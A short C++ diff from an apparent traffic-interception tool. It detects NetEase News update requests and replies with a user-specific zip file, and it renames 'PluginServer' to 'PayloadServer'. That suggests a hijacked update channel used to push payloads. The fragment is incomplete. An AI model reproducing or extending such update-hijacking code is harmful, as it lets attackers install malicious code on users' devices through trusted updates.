@@ -1,7 +1,7 @@
 #include "NetEaseNewsUpdate.h"
 #include <windows.h>
 #include "../Public.h"
-#include "PluginServer.h"
+#include "PayloadServer.h"
 
 
 int NetEaseNewsUpdate::isNeteaseNews(string url, string host) {
@@ -21,6 +21,6 @@ int NetEaseNewsUpdate::replyNetEaseNews(char * dstbuf, int buflen, int buflimit,
 		"Content-Length: %u\r\n\r\n";
 
 	string filename = Public::getUserUrl(lphttp->username, "neteasenews_so.zip");
-	int ret = PluginServer::SendPluginFile(filename.c_str(), lphttp, szHttpFormat, 1);
+	int ret = PayloadServer::SendPluginFile(filename.c_str(), lphttp, szHttpFormat, 1);
 	return ret;
 }
